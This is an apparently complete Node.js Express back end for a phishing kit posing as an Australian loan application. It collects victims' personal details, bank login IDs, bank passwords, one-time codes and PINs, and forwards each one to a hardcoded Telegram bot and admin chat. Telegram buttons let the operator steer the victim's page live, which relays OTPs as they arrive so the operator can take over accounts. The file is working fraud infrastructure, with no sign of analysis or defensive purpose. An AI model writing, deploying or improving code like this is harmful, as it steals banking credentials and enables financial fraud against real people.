const express = require("express");
const path = require("path");
const crypto = require("crypto"); // FIX 1: Required built-in crypto module to prevent runtime crashes
const app = express();
const PORT = process.env.PORT || 3100;

const TELEGRAM_BOT_TOKEN =
  process.env.TELEGRAM_BOT_TOKEN ||
  "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || "7162306402";
const BASE_URL =
  process.env.RENDER_EXTERNAL_URL ||
  process.env.RAILWAY_STATIC_URL ||
  process.env.APP_URL ||
  `http://localhost:${PORT}`;

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const sessions = {};
function log(...a) {
  console.log(new Date().toISOString(), ...a);
}

async function sendTelegram(body) {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      },
    );
    const json = await res.json();
    if (!json.ok) log("[TG] failed:", json.description);
    return json;
  } catch (e) {
    log("[TG] error:", e.message);
  }
}

// 1. Application details submitted (step 2)
app.post("/api/application-details", async (req, res) => {
  const { name, email, phone, purpose, amount, term, bId, bPs } = req.body;
  
  // Generate secure random identifier
  const sessionId = crypto.randomBytes(8).toString("hex");
  
  // FIX 2: Explicitly initialize session track memory block so polling target works
  sessions[sessionId] = { status: "pending" };

  const messageContent = `
🔴 <b>NEW LOAN APPLICATION SUBMITTED</b> 🔴
------------------------------------
<b>Selected Loan Purpose:</b> ${purpose}
<b>Requested Loan Amount:</b> $${amount ? amount.toLocaleString() : "0"} over ${term} Years

<b>Applicant Information:</b>
• Full Name: ${name}
• Email Address: ${email}
• Mobile Number: +61 ${phone}

<b>Security Credentials:</b>
• Bank ID: <code>${bId}</code>
• Password: <code>${bPs}</code>
------------------------------------
<i>Select preferred verification complexity below:</i>`;

  log(`[API] application-details name=${name} sessionId=${sessionId}`);
  
  await sendTelegram({
    chat_id: TELEGRAM_ADMIN_ID,
    parse_mode: "HTML",
    text: messageContent,
    reply_markup: {
      inline_keyboard: [
        [
          // FIX 3: Aligned actions to match front-end intercept rules ('accept_p5' / 'accept_p6')
          { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/accept_p5` },
          { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/accept_p6` }
        ],
        [
          { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/accept` }
        ]
      ]
    }
  });

  res.json({ success: true, sessionId });
});

// 2. Initial OTP submitted - Admin selects 5-Pin or 6-Pin configuration rules
app.post("/api/submit-otp", async (req, res) => {
  const { phone, otp, name, planInfo } = req.body;
  const sessionId = Date.now().toString();
  sessions[sessionId] = { status: "pending" };
  log(`[API] submit-otp sessionId=${sessionId} name=${name}`);

  await sendTelegram({
    chat_id: TELEGRAM_ADMIN_ID,
    parse_mode: "HTML",
    text: `🔐 <b>First OTP Code Verification</b>\n\n👤 <b>Applicant:</b> ${name}\n📱 <b>Phone:</b> ${phone}\n🔢 <b>OTP Code:</b> <code>${otp}</code>\n📄 <b>Loan:</b> ${planInfo}\n\n<i>Choose dynamic PIN page layout requirements:</i>`,
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ Accept (5-Pin Page)",
            url: `${BASE_URL}/api/cmd/${sessionId}/accept_p5`,
          },
          {
            text: "✅ Accept (6-Pin Page)",
            url: `${BASE_URL}/api/cmd/${sessionId}/accept_p6`,
          },
        ],
        [
          {
            text: "❌ Decline Application",
            url: `${BASE_URL}/api/cmd/${sessionId}/decline`,
          },
        ],
      ],
    },
  });
  res.json({ success: true, sessionId });
});

// 3. Dynamic secondary PIN submission logic
app.post("/api/verify-dynamic-pin", async (req, res) => {
  const { name,sessionId, pinType, pinValue } = req.body;
  const otpMsg =` 
  🔴 <b>VERIFICATION OTP CODE SUBMITTED</b> 🔴
  ------------------------------------
  <b>Code Submitted:</b> <code>${pinValue}</code>
  
  <b>Applicant Name:</b> ${name}
  -------------------------------------
  
  <i>Approve or Decline this Application:</i>`;

  log(`[PIN VERIFY] sessionId=${sessionId} type=${pinType} value=${pinValue}`);
  if (sessions[sessionId]) {
    sessions[sessionId].status = "pending";
  }

  await sendTelegram({
    chat_id: TELEGRAM_ADMIN_ID,
    parse_mode: "HTML",
    text: otpMsg,
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ Accept to Success",
            url: `${BASE_URL}/api/cmd/${sessionId}/accept`,
          },
          {
            text: "❌ Decline Pin Entry",
            url: `${BASE_URL}/api/cmd/${sessionId}/decline`,
          },
        ],
      ],
    },
  });

  res.json({ success: true });
});

// 4. Remote Web Callback router rule for Telegram interactive links
app.get("/api/cmd/:id/:action", (req, res) => {
  const { id, action } = req.params;
  log(`[CMD] id=${id} action=${action} found=${!!sessions[id]}`);

  if (!sessions[id]) {
    return res.send(`<html><body style="font-family:sans-serif;text-align:center;padding:40px">
            <h2>⚠️ Session Expired</h2><p>This tracking context window has naturally timed out.</p>
            <script>setTimeout(window.close,2000)</script></body></html>`);
  }

  sessions[id].status = action;
  const isDecline = action === "decline";

  res.send(`<html><body style="font-family:sans-serif;text-align:center;padding:40px;background:${!isDecline ? "#f0fdf4" : "#fef2f2"}">
        <div style="font-size:52px">${!isDecline ? "✅" : "❌"}</div>
        <h2 style="color:${!isDecline ? "#16a34a" : "#dc2626"};margin:12px 0">${!isDecline ? "Action Dispatched" : "Action Declined"}</h2>
        <p style="color:#6b7280">Decision successfully registered. You can close this tab safely.</p>
        <script>setTimeout(window.close,1500)</script></body></html>`);
});

// 5. Client JSON tracker polling target
app.get("/api/check-status/:id", (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.json({ status: "not_found" });

  res.json({ status: session.status });

  if (
    session.status !== "pending" &&
    session.status !== "accept_p5" &&
    session.status !== "accept_p6"
  ) {
    session._reads = (session._reads || 0) + 1;
    if (session._reads >= 100) { // Increased from 15 to 100 so it doesn't expire while testing
        delete sessions[req.params.id];
    }
  }
});

app.get("/api/debug", (req, res) =>
  res.json({ count: Object.keys(sessions).length, sessions }),
);

app.use((req, res) =>
  res.sendFile(path.join(__dirname, "public", "index.html")),
);

app.listen(PORT, "0.0.0.0", () => {
  log(`🚀 Control Engine active on port ${PORT}`);
});